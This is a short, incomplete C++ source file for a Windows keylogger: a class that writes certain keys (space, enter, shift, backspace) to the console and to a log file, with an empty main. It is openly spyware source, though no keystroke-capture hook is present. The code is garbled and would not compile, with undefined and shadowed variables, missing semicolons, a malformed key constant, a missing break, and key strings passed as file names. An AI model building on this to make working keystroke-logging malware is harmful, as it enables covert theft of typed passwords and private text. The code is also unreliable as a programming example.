#include <windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
using namespace std;
class Keylogger{
public:
	void WriteToFile(string file_name){
		ofstream logkey; //Create object for file stream
		logkey.open(file_name,fstream::app);
		logkey << text; //Write text string to file
		logkey.close();
	}
bool CheckListKey(int key){
	string key;
switch(key){
	case VK_SPACE:
	cout << " ";//Space key log 
	this->WriteToFile(" ")
	break;
	case VK RETURN:
	cout << "\n";//Enter key log
	this->WriteToFile(" ")
	break;
	case VK_SHIFT:
	string shift = "<shiftkey>";
	cout << shift;//Shift key log
	this->WriteToFile(shift);
	case VK_BACK:
	cout << "\b";
	WriteToFile("\b");
	break;
default:
cout << "Later use.";
}
}
}

int main(){
Keylogger keylog;
Keylogger *keys = &keylog;
return 0;
}
